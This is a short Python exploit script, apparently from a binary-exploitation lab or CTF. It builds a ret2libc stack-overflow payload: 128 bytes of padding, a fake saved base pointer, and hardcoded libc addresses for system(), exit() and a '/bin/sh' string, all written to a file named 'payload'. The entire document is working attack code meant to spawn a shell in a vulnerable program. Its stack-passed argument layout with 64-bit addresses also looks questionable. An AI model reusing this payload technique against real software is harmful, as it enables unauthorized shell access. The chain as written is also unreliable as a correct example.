#!/usr/bin/env python3

# 7ffff7e1f860
system_call = b"\x00\x00\x7f\xff\xf7\xe1\xf8\x60"[::-1]
# make sure the length fits the architecture!
# null is no issue here because scanf() does not stop reading there.

# p exit 0x7ffff7e15100
exit_call = b"\x00\x00\x7f\xff\xf7\xe1\x51\x00"[::-1]

# search-pattern '/bin/sh' 0x7ffff7f6e882
bin_sh_string = b"\x7f\xff\xf7\xf6\xe8\x82"[::-1]
# x/s 0x7ffff7f6e882

buffer = 128 * b"a"  # 0x61
backup_base_pointer = 8 * b"b"
backup_instruction_pointer = system_call

payload = (
    buffer
    + backup_base_pointer
    + backup_instruction_pointer
    + exit_call
    + bin_sh_string
)

f = open("payload", "wb")
f.write(payload)
